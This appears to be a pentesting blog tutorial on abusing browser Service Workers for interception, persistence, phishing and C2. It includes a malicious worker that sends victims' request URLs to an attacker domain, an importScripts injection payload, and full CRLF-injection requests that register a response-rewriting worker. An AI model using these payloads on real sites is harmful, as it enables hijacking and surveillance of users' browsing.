---
layout: post
title: Service Worker Tutorial
date: 2024-11-13 10:14:00-0400
description: Service Worker explaination/tutorial for pentesters
tags: web appsec tutorial c2
categories: tutorial
giscus_comments: true
related_posts: false
toc:
  sidebar: left
---

{% include figure.html path="assets/img/posts/sw/sw_logo.png" title="sw_tutorial" class="img-fluid rounded z-depth-1" %}

<br>

### Introduction
{:data-toc-text="Introduction"}
Service Worker (SW) is a script launched by the browser in the background process. It acts as a proxy between the server and the browser and extend the background processing capabilities for each page. The main advantages are offline interaction and push notifications.

SW runs in the worker context, so it does not have access to the DOM-tree and runs in a thread separate from the main JavaScript thread that controls the web application, and therefore does not block it. It is designed to be completely asynchronous, so synchronous APIs (XHR and LocalStorage) cannot be used in SW.

One aspect of SW technology is the Cache Interface, which is a caching mechanism completely separate from the HTTP cache. The Cache interface can be accessed both in the SW area and within the main thread. The Cache-Control HTTP header directives will not affect SW caching in any way.

{% include figure.html path="assets/img/posts/sw/sw_scheme.png" title="sw_tutorial" class="img-fluid rounded z-depth-1" %}


`Push notification` permissions affect the ability of the SW to interact with the server without user interaction. If `push notifications` are prohibited, this limits the SW's potential to pose a persistent threat. Otherwise, granting permissions increases security risks.

You can try out the ability to send notifications yourself using a simple [GitHub project](https://github.com/pirminrehm/service-worker-web-push-example).

{% include figure.html path="assets/img/posts/sw/sw3.png" title="sw_tutorial" class="img-fluid rounded z-depth-1" %}

Check registered SWs via URL:\
`chrome://serviceworker-internals/` (Chrome)\
`about:debugging#/runtime/this-firefox`(Firefox)

<br>

### Using SW in attack

#### Traffic interception
SW has access to the website's network traffic. It can intercept network traffic of files within its scope and modify any HTTP header and content.

This type of interception can be used to inject malicious content and is not subject to monitoring or security enforcement of existing defenses. For example, when a malicious third-party script is prohibited from modifying other DOM elements, it can use SW to directly modify the DOM content of a web page. In this way, an attacker can potentially use a compromised SW to bypass certain types of document context protection and execute a payload.

<br>

#### Pinning in web applications
Once successfully registered, the SW's contents (e.g. event listeners) will persist until a new SW replaces the old one. The payload stored in the SW can persist across multiple sessions.

An attacker can use this capability in combination with network traffic manipulation to take full control of the target web application on the client side for an extended period of time.

<br>

#### Push Notifications
One of the previously mentioned features of SW is that it allows a push event to be triggered remotely and a push message to be displayed at any time, regardless of whether the browser is open.
This feature gives two advantages to an attacker in implementing fishing attacks:
1. The attacker does not need to wait for the victim to visit the web application to start phishing - they can start the attack at any time using a push message.
2. The sender of the push message appears to come from a site that is usually legitimate. Therefore, the fishing message will look more realistic compared to a message coming from a different and unknown site.

<br>

### Example of creating SW
To create a malicious SW in the victim's browser, two conditions are required:
* JavaScript file containing source code of SW placing on same origin
* Use XSS to register it

Let's consider the simplest SW `sw.js` - we log the victim's fetch requests in the current Origin by duplicating their URL to the request to the controlled domain:

SW source code:
```js
self.addEventListener('fetch', function(e) {
  e.respondWith(caches.match(e.request).then(function(response) {
    fetch('https://<attacker_domain>/fetch_url/' + e.request.url)
});
```

Register SW:
```js
window.addEventListener('load', function() {
var sw = "sw.js";

navigator.serviceWorker.register(sw, {scope: '/'})
  .then(function(registration) {
    var xhttp2 = new XMLHttpRequest();
    xhttp2.open("GET", "https://<attacker_domain>/SW/success", true);
    xhttp2.send();
  }, function (err) {
    var xhttp2 = new XMLHttpRequest();
    xhttp2.open("GET", "https://<attacker_domain>/SW/error", true);
    xhttp2.send();
  });
  
});
```

The serviceWorker.register method is passed the URL of the script containing the SW source code, an important condition is that the **scriptURL** parameter must be Same-Origin, for this reason the SW cannot be installed from a vulnerable subdomain or host of the attacker. In the second parameter **options** we specified **scope** the entire root directory, this is what our SW will control.

Result using Burp Collaborator:
{% include figure.html path="assets/img/posts/sw/sw4.png" title="sw_tutorial" class="img-fluid rounded z-depth-1" %}

<br>


### Abusing importScripts
When registering a SW, additional parameters may be used, which may later end up in sensitive JS functions (gadgets). When discovering a web application, at least pay attention to how the SW request is made.

URL example with an additional parameter:
```
https://example.com/sw.js?userid=bob
```

The *importScripts* function called from SW can import a script from another domain. If this function is called using a parameter that an attacker can change, he will be able to import a cross origin JS script and get XSS. This even bypasses CSP protection.

Example of vulnerable source code:\
`sw.html`
```js
window.addEventListener('load', function() {
	navigator.serviceWorker.register(''/sw.js''+location.search)  
});
```
`sw.js`
```js 
const searchParams = new URLSearchParams(location.search);
let host = searchParams.get('host');
self.importScripts(host + "/sw_extra.js");
```

Achivieng XSS using next payload:
```
https://vulnerable.com/sw.html?host=attacker.com
```

As written in [one](https://dl.acm.org/doi/fullHtml/10.1145/3427228.3427290) paper, this piece of code was used by a web application dedicated to sports, with a traffic of about 50 million people.

<br>

### Register SW using CRLF-injection
CRLF-Injceiton which allows you to rewrite the HTTP response and do XSS, then its impact can be increased using SW.

Trigger XSS:
```
https://example.tld/some/path/foo/bar/?param=x%0D%0AContent-Type:text/
html%0D%0AContent-Length:20%0D%0A%0D%0A<script>XSS</script>
```

Upload JS-file:
```
https://example.tld/some/path/foo/bar/?param=x%0D%0AContent-Type:text/
javascript%0D%0AContent-Length:7%0D%0A%0D%0AJS_file
```

There are two necessary points to register SW.
But in that case, one problem is actually exists - scope /some/path/foo/bar/, which is not interesting and its better to find a way to make scope a root /.

If read the documentation of SW, there is information about the `Service-Worker-Allowed` header, which is set in the HTTP response along with the worker's JS code, and through which it can be redefine the scope.

Which in case of CRLF Injection allows to register a SW located in any folder on the root of the site.

Final source code which register SW with `Service-Worker-Allowed: /` header. SW will change all responses of HTTP-traffic to "Fake response":

Request:
```
https://example.tld/some/path/foo/bar/?param=x%0D%0AService-Worker-Allowed:/
%0D%0AContent-Type:text/javascript%0D%0AContent-Length:162%0D%0A%0D%0Aself.addEventListener
(%22fetch%22,function(event){event.respondWith(new%20Response(%22Fake%20response%22,
{status:200,statusText:%22OK%22,headers:{"Content-Type%22:%22text/html%22}}))})
```

Response
```js
Service-Worker-Allowed:/
Content-Type:text/javascript
Content-Length:162


self.addEventListener("fetch",function(event){event.respondWith(new Response("Fake
 response",{status:200,statusText:"OK",headers:{"Content-Type":"text/html"}}))})
```

Connect SW using XSS and request:
```
https://example.tld/some/path/foo/bar/?param=x%0D%0AContent-Type:text/
html%0D%0AContent-Length:378%0D%0A%0D%0A%3Cscript%3Enavigator.serviceWorker.register('/some/
path/foo/bar/?param=x%250D%250AService-Worker-Allowed:/%250D%250AContent-Type:text/
javascript%250D%250AContent-Length:162%250D%250A%250D%250Aself.addEventListener
(%2522fetch%2522,function(event){event.respondWith(new%2520Response
(%2522Fake%2520response%2522,{status:200,statusText:%2522OK%2522,headers:{
   %2522Content-Type%2522:%2522text/html%2522}}))})',{scope:'/'})%3C/script%3E
```

Response:
```html
Content-Type:text/html
Content-Length:378

<script>navigator.serviceWorker.register('/some/path/foo/bar/?
param=x%0D%0AService-Worker-Allowed:/%0D%0AContent-Type:text/
javascript%0D%0AContent-Length:162%0D%0A%0D%0Aself.addEventListener(%22fetch%22,function
(event){event.respondWith(new%20Response(%22Fake%20response%22,{status:200,
statusText:%22OK%22,headers:{"Content-Type%22:%22text/html%22}}))})',{scope:'/'})</script>
```


Thank you, BlackFan, for post in Telegram

<br>


### C2 using SW
If you are a bit into RedTeam and are familiar with the concept of Command and Control, then the [Shadow Workers](https://shadow-workers.github.io) tool was created for you, as well as articles using this tool:
1. [Introduction and Target Application Setup](https://trustedsec.com/blog/persistence-through-service-workers-part-1-introduction-and-target-application-setup)
2. [C2 Setup and Use](https://trustedsec.com/blog/persistence-through-service-workers-part-2-c2-setup-and-use)
3. [Easy JavaScript Payload Deployment](https://trustedsec.com/blog/persistence-through-service-workers-part-3-easy-javascript-payload-deployment)


---